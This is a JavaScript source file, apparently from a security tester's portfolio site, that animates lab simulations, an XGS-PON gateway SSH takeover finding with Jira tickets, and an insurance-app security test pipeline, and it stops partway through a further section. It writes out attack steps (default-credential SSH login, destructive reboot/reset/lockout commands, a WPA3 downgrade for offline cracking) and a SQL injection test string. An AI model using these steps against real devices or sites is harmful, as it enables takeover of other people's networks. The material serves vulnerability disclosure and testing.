      if (all.length > 14) all[0].remove();
      li++;
    }
    pushLog(); pushLog(); pushLog();
    timers.every(pushLog, 1400);

    /* ---- Tab 4: CyberGuardian lab pipeline ---- */
    function playCyberguardian() {
      const pipeSteps = $$('#cg-pipe .cg-pstep', host);
      pipeSteps.forEach((s) => s.classList.remove('active', 'done'));
      const procRows = $$('.cg-proc-row[data-proc]', host);
      procRows.forEach((r) => { r.classList.remove('scanning', 'flag', 'clean'); const v = $('[data-v]', r); if (v) v.textContent = '…'; });
      const verdict = $('#cg-verdict', host), verdictSub = $('#cg-verdict-sub', host);
      if (verdict) { verdict.textContent = 'analyzing…'; verdict.style.color = ''; }
      if (verdictSub) verdictSub.textContent = 'correlating 5 detection vectors…';
      const reportSecs = $$('#cg-report .cg-report-sec', host);
      reportSecs.forEach((s) => s.classList.remove('show'));

      // step 1: process sweep
      timers.later(() => pipeSteps[0] && pipeSteps[0].classList.add('active'), 300);
      procRows.forEach((row, i) => {
        timers.later(() => row.classList.add('scanning'), 500 + i * 700);
        timers.later(() => {
          row.classList.remove('scanning');
          const isFlag = i === 2 || i === 3;
          row.classList.add(isFlag ? 'flag' : 'clean');
          const v = $('[data-v]', row);
          if (v) v.textContent = isFlag ? 'MALICIOUS' : 'CLEAN';
        }, 500 + i * 700 + 550);
      });
      const tSweepEnd = 500 + procRows.length * 700 + 600;
      timers.later(() => { if (pipeSteps[0]) { pipeSteps[0].classList.remove('active'); pipeSteps[0].classList.add('done'); } pipeSteps[1] && pipeSteps[1].classList.add('active'); }, tSweepEnd);

      // step 2+3: IOC + AI
      timers.later(() => { if (pipeSteps[1]) { pipeSteps[1].classList.remove('active'); pipeSteps[1].classList.add('done'); } if (pipeSteps[2]) pipeSteps[2].classList.add('active'); }, tSweepEnd + 1800);
      timers.later(() => {
        if (verdict) { verdict.textContent = 'MALICIOUS — 94.7% confidence'; verdict.style.color = 'var(--neon-3)'; }
        if (verdictSub) verdictSub.textContent = 'Trojan.CredStealer · risk 9.2/10 · MITRE: T1055 · T1071.001 · T1003.001 · T1548.002';
      }, tSweepEnd + 3600);
      timers.later(() => { if (pipeSteps[2]) { pipeSteps[2].classList.remove('active'); pipeSteps[2].classList.add('done'); } if (pipeSteps[3]) pipeSteps[3].classList.add('active'); }, tSweepEnd + 4000);

      // step 4: report sections appear
      reportSecs.forEach((s, i) => {
        timers.later(() => s.classList.add('show'), tSweepEnd + 4300 + i * 800);
      });
      const total = tSweepEnd + 4300 + reportSecs.length * 800;
      timers.later(() => { if (pipeSteps[3]) { pipeSteps[3].classList.remove('active'); pipeSteps[3].classList.add('done'); } }, total);

      timers.later(() => playCyberguardian(), total + 5000); // loop
    }
    playCyberguardian();

    /* ---- Tab 5: TryHackMe path bars animate ---- */
    timers.later(() => {
      $$('.thm-bar-fill', host).forEach((f) => {
        f.style.width = f.getAttribute('data-thm-fill') + '%';
      });
    }, 400);

    // build tab nav
    ctx.tabs = [
      { id: 'dashboard',    label: '// SOC & Pentest Lab Simulation' },
      { id: 'sigma',        label: '// Lab 02 — Sigma Rule' },
      { id: 'spl',          label: '// Lab 03 — Splunk SPL' },
      { id: 'cyberguardian', label: '// Lab 04 — CyberGuardian + AI' },
      { id: 'thm',          label: '// TryHackMe Achievements' }
    ];
  };

  /* homelab-attack-chain (project entry) reuses the soc-homelab renderer */
  SIMS['homelab-attack-chain'] = (host, ctx) => {
    SIMS['soc-homelab'](host, ctx);
  };

  /* =================================================================
   *  2. LIBERTYGLOBAL — Gateway Validation & SSH Finding
   *     Tab 1: visual SSH takeover replay (attacker → XGS-PON gateway
   *            → home network) with animated attack steps & device state
   *     Tab 2: two Jira tickets with steps-to-reproduce
   *     Tab 3: validation metrics
   * ================================================================= */
  SIMS['libertyglobal-soc'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">LIBERTYGLOBAL — GATEWAY VALIDATION & SECURITY TESTING</div>
      <div class="sim-p">Anomaly-driven security testing across LibertyGlobal's production DOCSIS, RDK-B, XGS-PON and VoIP infrastructure. This replay reconstructs the discovery of the Critical-rated SSH finding on the XGS-PON product line: a remote attacker logs into the gateway over SSH with the default GUI credentials and takes full control — no confirmation prompts, admin-equivalent rights, customer locked out.</div>

      <div class="sim-section active" data-sim="attack">
        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val" id="lg-steps-v">0/7</div><div class="kpi-box-lbl">Attack steps done</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="lg-priv">—</div><div class="kpi-box-lbl">Privilege obtained</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="lg-conf">0</div><div class="kpi-box-lbl">Confirmations asked</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="lg-cvss">CVSS 8.4</div><div class="kpi-box-lbl">Severity — CRITICAL</div></div>
        </div>

        <div class="vs-stage" id="lg-stage" style="min-height:270px">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">XGS-PON HOME LAB — GATEWAY 192.168.1.1 · FW v3.6.9</span>

          <div class="vs-node attacker" id="lg-atk" style="left:10%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">🏴‍☠️</span>
            <div class="vs-node-title">ATTACKER</div>
            <div class="vs-node-sub" id="lg-atk-sub">Kali · 192.168.1.100<br>putty.exe → SSH :22</div>
          </div>

          <div class="vs-node on" id="lg-gw" style="left:50%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📡</span>
            <div class="vs-node-title">XGS-PON GATEWAY</div>
            <div class="vs-node-sub" id="lg-gw-sub">192.168.1.1 · SSH ON<br>state: ONLINE</div>
          </div>

          <div class="vs-node on" id="lg-v1" style="left:87%;top:20%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">HOME LAPTOP</div>
            <div class="vs-node-sub" id="lg-v1-sub">WiFi connected<br>internet OK ✓</div>
          </div>

          <div class="vs-node on" id="lg-v2" style="left:87%;top:78%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📱</span>
            <div class="vs-node-title">FAMILY PHONES</div>
            <div class="vs-node-sub" id="lg-v2-sub">WiFi connected<br>internet OK ✓</div>
          </div>

          <div class="vs-phase-line" id="lg-phase">t+0s — attacker scans the home network segment</div>
        </div>

        <div class="skill-modal-grid">
          <div>
            <div class="sim-h">ATTACK CHAIN — STEP BY STEP</div>
            <ul class="vs-steps" id="lg-steps">
              <li class="vs-step pending"><span class="vs-step-ico">🔎</span><div class="vs-step-body"><b>Recon</b> — port scan from LAN: <span class="code-inline">nmap -p22 192.168.1.0/24</span> → SSH open on gateway</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔑</span><div class="vs-step-body"><b>Default credentials</b> — <span class="code-inline">ssh admin@192.168.1.1</span> with GUI default admin/admin → session opened</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">📜</span><div class="vs-step-body"><b>Reconnaissance</b> — <span class="code-inline">show running-config</span> → access-level: FULL — admin-equivalent shell</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔄</span><div class="vs-step-body"><b>Destructive #1</b> — <span class="code-inline">reboot</span> executes instantly, NO confirmation prompt — gateway restarts</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">⚠️</span><div class="vs-step-body"><b>Destructive #2</b> — <span class="code-inline">restore defaults</span> — factory reset wipes customer configuration</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">📡</span><div class="vs-step-body"><b>WiFi hijack</b> — <span class="code-inline">set wifi ssid FreeWiFi password stolen123</span> — home network renamed &amp; re-keyed</div><span class="vs-step-state">QUEUED</span></li>
              <li class="vs-step pending"><span class="vs-step-ico">🔒</span><div class="vs-step-body"><b>Lockout</b> — <span class="code-inline">set gui-password</span> + <span class="code-inline">set ssh-password</span> — customer locked out of own gateway</div><span class="vs-step-state">QUEUED</span></li>
            </ul>
          </div>
          <div>
            <div class="sim-h">GATEWAY STATE MONITOR</div>
            <div class="cg-report" style="min-height:100%">
              <div class="cg-report-head">
                <span class="cg-report-title">XGS-PON · 192.168.1.1</span>
                <span class="jira-sev critical" id="lg-badge" style="display:none">UNDER ATTACK</span>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Current state</h6>
                <div id="lg-state-line" style="font-size:14px;color:var(--fg);font-family:var(--mono)">ONLINE — normal operation</div>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Management plane</h6>
                <div id="lg-mgmt-line">GUI: user password · SSH: admin (default creds) · TR-069: ACS</div>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Confirmation prompts</h6>
                <div id="lg-conf-line">reboot: none · factory reset: none · wifi change: none</div>
              </div>
              <div class="cg-report-sec show">
                <h6>Customer impact</h6>
                <div id="lg-impact-line">none</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="finding">
        <div class="sim-h">JIRA — TWO CRITICAL FINDINGS FROM THE XGS-PON PRODUCT LINE</div>
        <div class="sim-p">Both tickets include reproducible steps and were validated on factory firmware before the release gate; remediation shipped in firmware v3.7.2.</div>
        <div class="jira-grid">
          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">XGS-2021-0144</span>
              <span class="jira-sev critical">CRITICAL · CVSS 8.4</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> XGS-PON Gateway (LibertyGlobal broadband)<br>
                <b>Type:</b> Access control / privilege escalation<br>
                <b>Tool:</b> PuTTY (SSH client) · <b>Reproducibility:</b> always on factory firmware
              </div>
              <h5>Description</h5>
              SSH remote access is enabled by default and accepts the admin-equivalent GUI default credentials — full unauthenticated remote control of the gateway without any user interaction.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Reset the XGS-PON gateway to factory firmware (v3.6.9)</li>
                <li>From a LAN host, connect with PuTTY: <span class="code-inline">ssh admin@192.168.1.1</span></li>
                <li>Authenticate with the GUI default credentials (admin/admin) — session opens</li>
                <li>Run <span class="code-inline">show running-config</span> → access-level: full (admin-equivalent)</li>
                <li>Run <span class="code-inline">reboot</span> then <span class="code-inline">restore defaults</span> — both execute with no confirmation prompt</li>
                <li>Run <span class="code-inline">set wifi ssid … password …</span> and <span class="code-inline">set gui-password …</span> — WiFi hijacked and customer locked out</li>
              </ol>
              <h5>Impact</h5>
              Full unauthenticated remote takeover: interface enumeration, reboot, factory restore, WiFi re-configuration, GUI/SSH password change — admin-equivalent access with zero user interaction.
              <h5>Remediation (shipped in v3.7.2)</h5>
              <ul class="jira-rem">
                <li>SSH remote access <b style="color:var(--neon)">deactivated by default</b> — opt-in only</li>
                <li>SSH requires a user-set password (never the GUI default)</li>
                <li>SSH session is <b style="color:var(--neon)">read-only</b> — no admin-equivalent rights</li>
                <li>Admin operations moved to GUI + CLI with separate audit logging</li>
              </ul>
            </div>
          </div>

          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">XGS-2022-0231</span>
              <span class="jira-sev critical">HIGH · CVSS 7.4</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> XGS-PON Gateway — WiFi interface<br>
                <b>Type:</b> Cryptographic downgrade (WPA2/WPA3)<br>
                <b>Tool:</b> Wireshark + wpa_supplicant · <b>Reproducibility:</b> 100% on 2.4G &amp; 5G SSIDs
              </div>
              <h5>Description</h5>
              The default SSID is configured in WPA2/WPA3 "transition mode" without PMF enforcement: WPA3-SAE clients silently downgrade to WPA2-PSK, exposing the pre-shared key to offline dictionary attacks.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Boot the gateway with factory WiFi configuration</li>
                <li>Start Wireshark monitor-mode capture on channel of SSID <span class="code-inline">LibertyGlobal-Home</span></li>
                <li>Associate a WPA3-SAE-capable client (wpa_supplicant, sae_groups=19)</li>
                <li>Observe the handshake: SAE Commit → <b>no SAE Confirm</b> → client falls back to WPA2 4-way handshake</li>
                <li>Capture the 4-way handshake → confirm PMK derives from the (weak) PSK — offline crack feasible</li>
              </ol>
              <h5>Impact</h5>
              Attacker within radio range captures the WPA2 handshake and performs an offline dictionary attack against the default PSK — full WiFi access, then LAN access to every home device.
              <h5>Remediation</h5>
              <ul class="jira-rem">
                <li>WPA3-SAE-only mode enforced (PMF required) — transition mode removed</li>
                <li>Default PSK replaced by per-installation random passphrase</li>
                <li>WiFi security regression test added to the pre-release gate</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="metrics">
        <div class="sim-h">VALIDATION METRICS — XGS-PON Product Line (lead role)</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val">8</div><div class="siem-kpi-lbl">ENGINEERS LED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">2</div><div class="siem-kpi-lbl">MONTHS SOLO</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val">9</div><div class="siem-kpi-lbl">PROTOCOLS TESTED</div></div>
          <div class="siem-kpi alert"><div class="siem-kpi-val">CVSS 8.4</div><div class="siem-kpi-lbl">CRITICAL FINDING</div></div>
        </div>
        <div class="sim-h" style="margin-top:14px">PROTOCOLS VALIDATED (level 4 / 5)</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:10px">
          ${['TCP/IP','DHCP','DNS','HTTP/HTTPS','SIP/RTP','TLS','SSH','TR-069','ARP','ICMP','GRE','PPP','WiFi 6','WPA2/3','DOCSIS 3.1','XGS-PON','VoIP','Firewall','NAT','IPSec','AES'].map(p => `<span class="stack-chip">${p}</span>`).join('')}
        </div>
      </div>
    `;

    /* ---- Tab 1: SSH takeover animation ---- */
    const stage = $('#lg-stage', host);
    const svg = vsInitSvg(stage, 270);
    const VB = 270;
    const linkAtk = vsLink(svg, 10, 50, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkV1  = vsLink(svg, 50, 50, 87, 20, VB, { hidden: true });
    const linkV2  = vsLink(svg, 50, 50, 87, 78, VB, { hidden: true });

    const phase = $('#lg-phase', host);
    const atkSub = $('#lg-atk-sub', host);
    const gwSub = $('#lg-gw-sub', host);
    const gwNode = $('#lg-gw', host);
    const atkNode = $('#lg-atk', host);
    const v1 = $('#lg-v1', host), v1s = $('#lg-v1-sub', host);
    const v2 = $('#lg-v2', host), v2s = $('#lg-v2-sub', host);
    const badge = $('#lg-badge', host);
    const stateLine = $('#lg-state-line', host);
    const mgmtLine = $('#lg-mgmt-line', host);
    const confLine = $('#lg-conf-line', host);
    const impactLine = $('#lg-impact-line', host);
    const kSteps = $('#lg-steps-v', host);
    const kPriv = $('#lg-priv', host);
    const kConf = $('#lg-conf', host);

    function setState(lineEl, txt, color) {
      if (lineEl) { lineEl.innerHTML = txt; if (color) lineEl.style.color = color; else lineEl.style.color = ''; }
    }

    function playTakeover() {
      // reset
      if (linkAtk) { linkAtk.off(); linkAtk.deactivate(); }
      [linkV1, linkV2].forEach((l) => { if (l) { l.deactivate(); } });
      if (linkV1) linkV1.packets(2, 'var(--neon)', 1.8).on();
      if (linkV2) linkV2.packets(2, 'var(--neon)', 1.8).on();
      gwNode.className = 'vs-node on';
      atkNode.className = 'vs-node attacker';
      v1.className = 'vs-node on'; v2.className = 'vs-node on';
      v1s.innerHTML = 'WiFi connected<br>internet OK ✓';
      v2s.innerHTML = 'WiFi connected<br>internet OK ✓';
      if (badge) badge.style.display = 'none';
      setState(stateLine, 'ONLINE — normal operation', '');
      setState(mgmtLine, 'GUI: user password · SSH: admin (default creds) · TR-069: ACS');
      setState(confLine, 'reboot: none · factory reset: none · wifi change: none');
      setState(impactLine, 'none');
      if (kSteps) kSteps.textContent = '0/7';
      if (kPriv) { kPriv.textContent = '—'; kPriv.className = 'kpi-box-val alert'; }
      if (kConf) kConf.textContent = '0';

      const phases = [
        { dur: 2400, run() {
            phase.innerHTML = 't+0s — attacker scans the home network segment';
            if (linkAtk) linkAtk.activate();
          },
          end() { if (kSteps) kSteps.textContent = '1/7'; } },
        { dur: 2400, run() {
            phase.innerHTML = '<span class="warn">t+2s — default credentials accepted — SSH session opened</span>';
            atkNode.className = 'vs-node attacker on';
            if (linkAtk) linkAtk.packets(3, 'var(--neon-4)', 1.0).on();
            setState(mgmtLine, 'GUI: user password · <b style="color:var(--neon-4)">SSH: admin/admin — SESSION OPEN</b> · TR-069: ACS');
          },
          end() {
            if (kSteps) kSteps.textContent = '2/7';
            if (kPriv) { kPriv.textContent = 'ADMIN'; }
            if (linkAtk) linkAtk.packets(3, 'var(--neon-3)', 0.8).on();
          } },
        { dur: 2600, run() {
            phase.innerHTML = '<span class="warn">t+5s — running-config: access-level FULL — admin-equivalent shell</span>';
            atkSub.innerHTML = 'Kali · 192.168.1.100<br>access-level: FULL';
            setState(stateLine, 'SSH session — privilege: FULL (admin-equivalent)', 'var(--neon-4)');
          },
          end() { if (kSteps) kSteps.textContent = '3/7'; } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+8s — reboot executed with NO confirmation — gateway restarting</span>';
            gwNode.className = 'vs-node hit';
            gwSub.innerHTML = '192.168.1.1 · SSH ON<br>state: REBOOTING';
            if (badge) badge.style.display = '';
            setState(stateLine, 'REBOOTING — triggered remotely, no prompt', 'var(--neon-3)');
          },
          end() {
            if (kSteps) kSteps.textContent = '4/7';
            if (kConf) kConf.textContent = '0';
          } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+11s — factory restore wipes customer configuration</span>';
            gwSub.innerHTML = '192.168.1.1 · SSH ON<br>state: CONFIG WIPED';
            setState(stateLine, 'FACTORY DEFAULTS — customer config erased', 'var(--neon-3)');
            setState(impactLine, 'customer settings, WiFi profiles and port forwards lost', 'var(--neon-3)');
          },
          end() { if (kSteps) kSteps.textContent = '5/7'; } },
        { dur: 2800, run() {
            phase.innerHTML = '<span class="err">t+14s — WiFi hijacked: SSID renamed, PSK replaced — home devices disconnected</span>';
            v1.className = 'vs-node hit'; v2.className = 'vs-node hit';
            v1s.innerHTML = 'WiFi LOST ✗<br>ssid: FreeWiFi';
            v2s.innerHTML = 'WiFi LOST ✗<br>offline';
            if (linkV1) { linkV1.off(); }
            if (linkV2) { linkV2.off(); }
            setState(stateLine, 'WiFi RE-KEYED — ssid=FreeWiFi · psk=stolen123', 'var(--neon-3)');
          },
          end() { if (kSteps) kSteps.textContent = '6/7'; } },
        { dur: 3200, run() {
            phase.innerHTML = '<span class="err">t+17s — GUI + SSH passwords changed — customer LOCKED OUT of own gateway</span>';
            setState(mgmtLine, 'GUI: attacker password · <b style="color:var(--neon-3)">SSH: attacker password</b> · TR-069: ACS');
            setState(stateLine, 'LOCKED OUT — attacker holds all credentials', 'var(--neon-3)');
            setState(impactLine, 'full unauthenticated remote takeover — CVSS 8.4, zero user interaction', 'var(--neon-3)');
          },
          end() {
            if (kSteps) kSteps.textContent = '7/7';
            phase.innerHTML = '<span class="err">VALIDATION RESULT — SSH session grants full admin-equivalent control → Jira XGS-2021-0144 → remediation in v3.7.2 (SSH opt-in + read-only)</span>';
          } }
      ];
      const total = vsRunSteps($('#lg-steps', host), timers, phases);
      timers.later(() => playTakeover(), total + 4500);
    }
    playTakeover();

    ctx.tabs = [
      { id: 'attack',  label: '// Attack Replay — SSH Takeover' },
      { id: 'finding', label: '// Jira Ticket' },
      { id: 'metrics', label: '// Validation Metrics' }
    ];
  };

  /* =================================================================
   *  3. CAPGEMINI / AXA — Automation Pipeline
   *     Tab 3: live automation run — Azure pipeline stages, parallel
   *            device farm, security test queue with PASS/FAIL verdicts
   * ================================================================= */
  SIMS['axa-automation'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">AXA ASSURANCE — MOBILE AUTOMATION PIPELINE</div>
      <div class="sim-p">Automated security test suites for AXA Assurance (France) mobile (iOS + Android) and web platforms using Appium, Selenium WebDriver and Java on Azure cloud. Tests implicitly validated authentication flows, session handling, and access-control logic — catching flaws that static analysis missed.</div>

      <div class="sim-section active" data-sim="flow">
        <div class="sim-h">SHIFT-LEFT PIPELINE</div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">01</span>Manual Test</div>
          <div class="ah-step"><span class="ah-step-no">02</span>Automate (Java)</div>
          <div class="ah-step"><span class="ah-step-no">03</span>Push to GitHub</div>
          <div class="ah-step"><span class="ah-step-no">04</span>Azure Device Cloud</div>
        </div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">05</span>Run on iOS + Android</div>
          <div class="ah-step"><span class="ah-step-no">06</span>Session Check</div>
          <div class="ah-step"><span class="ah-step-no">07</span>Auth Verify</div>
          <div class="ah-step"><span class="ah-step-no">08</span>Report</div>
        </div>

        <div class="sim-h" style="margin-top:14px">SHIFT-LEFT SECURITY TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ Authentication with wrong usernames/passwords (negative testing)</li>
          <li>▸ Malicious file upload attempts (web forms)</li>
          <li>▸ SQL injection simulation on AXA web forms</li>
          <li>▸ Session handling after logout (token revocation)</li>
          <li>▸ Access-control boundary checks (user A → user B data)</li>
          <li>▸ Payment simulation flow integrity</li>
        </ul>
      </div>

      <div class="sim-section" data-sim="code">
        <div class="sim-h">JAVA + SELENIUM — AUTH NEGATIVE TEST</div>
        <pre class="code-viewer"><span class="k">import</span> org.openqa.selenium.*;
<span class="k">import</span> org.openqa.selenium.remote.RemoteWebDriver;
<span class="k">import</span> java.net.URL;

<span class="k">public class</span> <span class="n">AxaAuthNegativeTest</span> {

  <span class="c">// Azure cloud device — iOS + Android + web</span>
  <span class="k">static</span> WebDriver driver = <span class="k">new</span> RemoteWebDriver(
    <span class="k">new</span> URL(<span class="s">"https://axa-cloud.azurecloud.com/wd/hub"</span>),
    cap(<span class="s">"iPhone 13"</span>, <span class="s">"15.4"</span>, <span class="s">"AXA Mobile"</span>));

  <span class="k">@Test</span>
  <span class="k">public void</span> <span class="n">shouldRejectInvalidPassword</span>() {
    driver.get(<span class="s">"https://m.axa.fr/login"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"username"</span>)).sendKeys(<span class="s">"legit.user@axa.fr"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"password"</span>)).sendKeys(<span class="s">"' OR '1'='1"</span>);
    driver.findElement(<span class="k">By</span>.id(<span class="s">"submit"</span>)).click();

    <span class="c">// shift-left: assertion runs at build time, not post-deploy</span>
    <span class="k">assert</span> !driver.getTitle().contains(<span class="s">"Dashboard"</span>)
      : <span class="s">"FAIL: SQLi bypassed auth!"</span>;
    <span class="k">assert</span> driver.findElement(<span class="k">By</span>.css(<span class="s">".error-msg"</span>)).isDisplayed();
  }
}</pre>
      </div>

      <div class="sim-section" data-sim="run">
        <div class="sim-h">LIVE RUN — AZURE PIPELINE #2024-1187 (security suite)</div>
        <div class="sim-p">A real run of the automated security suite: the Azure DevOps pipeline executes the Java test suite in parallel on three cloud targets — an iPhone, an Android flagship and a desktop browser. Every test verdict lands in the live queue below; failures raise a defect instantly.</div>

        <div class="ah-flow" id="ax-pipe" style="margin-bottom:14px">
          <div class="ah-step" data-pipe="1"><span class="ah-step-no">⚙️ 01</span>Build + compile</div>
          <div class="ah-step" data-pipe="2"><span class="ah-step-no">🧪 02</span>Unit tests</div>
          <div class="ah-step" data-pipe="3"><span class="ah-step-no">🔐 03</span>Security suite</div>
          <div class="ah-step" data-pipe="4"><span class="ah-step-no">📊 04</span>Report + defects</div>
        </div>

        <div class="sim-h">DEVICE FARM — PARALLEL EXECUTION</div>
        <div class="arun-farm">
          <div class="arun-dev" data-dev="ios">
            <div class="arun-dev-head">📱 iPhone 13 — iOS 15.4</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Appium · XCUITest</span><span data-count>0/9</span></div>
          </div>
          <div class="arun-dev" data-dev="android">
            <div class="arun-dev-head">📱 Galaxy S22 — Android 13</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Appium · UIAutomator2</span><span data-count>0/9</span></div>
          </div>
          <div class="arun-dev" data-dev="web">
            <div class="arun-dev-head">💻 Chrome 120 — Web App</div>
            <div class="arun-bar"><div class="arun-bar-fill" data-fill></div></div>
            <div class="arun-dev-sub"><span>Selenium WebDriver</span><span data-count>0/9</span></div>
          </div>
        </div>

        <div class="sim-h">SECURITY TEST QUEUE — LIVE VERDICTS</div>
        <ul class="vs-steps" id="ax-queue">
          <li class="vs-step pending"><span class="vs-step-ico">🔐</span><div class="vs-step-body"><b>TC-AUTH-01</b> — login with wrong password rejected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">💉</span><div class="vs-step-body"><b>TC-AUTH-02</b> — SQL injection on login form blocked</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🎫</span><div class="vs-step-body"><b>TC-SESS-01</b> — session token revoked after logout</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🎫</span><div class="vs-step-body"><b>TC-SESS-02</b> — back button after logout must NOT restore session</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📤</span><div class="vs-step-body"><b>TC-UPLOAD-01</b> — macro-enabled file upload rejected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🛂</span><div class="vs-step-body"><b>TC-ACL-02</b> — user A cannot read user B policy data</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">💳</span><div class="vs-step-body"><b>TC-PAY-04</b> — payment amount tampering detected</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🧿</span><div class="vs-step-body"><b>TC-XSS-03</b> — script injection in claim form sanitized</div><span class="vs-step-state">QUEUED</span></li>
        </ul>

        <div class="kpi-strip" style="margin-top:14px;margin-bottom:0">
          <div class="kpi-box"><div class="kpi-box-val" id="ax-total">0</div><div class="kpi-box-lbl">Tests executed</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="ax-pass">0</div><div class="kpi-box-lbl">Passed</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="ax-fail">0</div><div class="kpi-box-lbl">Failed → defect</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="ax-time">00:00</div><div class="kpi-box-lbl">Elapsed</div></div>
        </div>
      </div>
    `;

    /* ---- Tab 3: live automation run ---- */
    function playRun() {
      // pipeline stages cascade
      const pipeSteps = $$('#ax-pipe .ah-step', host);
      pipeSteps.forEach((s) => { s.classList.remove('active', 'done'); });
      pipeSteps.forEach((s, i) => {
        timers.later(() => s.classList.add('active'), 400 + i * 2400);
        timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 400 + i * 2400 + 1800);
      });

      // device farm progress
      const devs = $$('.arun-dev', host);
      devs.forEach((d) => {
        d.classList.remove('done');
        const fill = $('[data-fill]', d), count = $('[data-count]', d);
        if (fill) fill.style.width = '0%';
        let n = 0;
        const total = 9;
        const iv = timers.every(() => {
          n = Math.min(total, n + 1);
          if (fill) fill.style.width = Math.round((n / total) * 100) + '%';
          if (count) count.textContent = `${n}/${total}`;
          if (n >= total) { clearInterval(iv); d.classList.add('done'); }
        }, 1900);
      });

      // test queue — TC-SESS-02 fails (session not revoked), everything else passes
      const phases = [
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 2200, fail: true, end() {} }, // TC-SESS-02 FAIL → defect
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} },
        { dur: 1500, end() {} }
      ];
      const kTotal = $('#ax-total', host), kPass = $('#ax-pass', host),
            kFail = $('#ax-fail', host), kTime = $('#ax-time', host);
      let pass = 0, fail = 0, secs = 0;
      const clock = timers.every(() => {
        secs += 7;
        if (kTime) {
          const m = String(Math.floor(secs / 60)).padStart(2, '0');
          const s = String(secs % 60).padStart(2, '0');
          kTime.textContent = `${m}:${s}`;
        }
      }, 1000);

      const wrapped = phases.map((p, i) => ({
        ...p,
        end() {
          if (p.fail) fail += 1; else pass += 1;
          if (kTotal) kTotal.textContent = pass + fail;
          if (kPass) kPass.textContent = pass;
          if (kFail) kFail.textContent = fail;
          if (p.fail && kFail) kFail.textContent = fail + ' → AXA-1247';
          if (p.end) p.end();
        }
      }));

      const total = vsRunSteps($('#ax-queue', host), timers, wrapped);
      timers.later(() => clearInterval(clock), total);
      timers.later(() => playRun(), total + 5000);
    }
    playRun();

    // animate shift-left flow (tab 1) once
    $$('.ah-step', host).forEach((s, i) => {
      if (s.closest('[data-sim="run"]')) return; // only the pipeline tab
      timers.later(() => s.classList.add('active'), 300 + i * 180);
      timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 300 + i * 180 + 600);
    });

    ctx.tabs = [
      { id: 'flow', label: '// Pipeline' },
      { id: 'code', label: '// Java Code' },
      { id: 'run',  label: '// Live Test Run' }
    ];
  };

  /* =================================================================
   *  4. SAGEMCOM — Protocol Vulnerability Assessment
   *     Tab 1: visual DDoS attack replay (botnet → SIP gateway) with
   *            live Wireshark capture + WPA3/SAE downgrade check
   *     Tab 2: two Jira tickets with steps-to-reproduce
   *     Tab 3: ISO 27001 traceability matrix (req ⇄ testcase ⇄ finding)
   * ================================================================= */
  SIMS['sagemcom-terminal'] = (host, ctx) => {
    const timers = makeTimers(host);
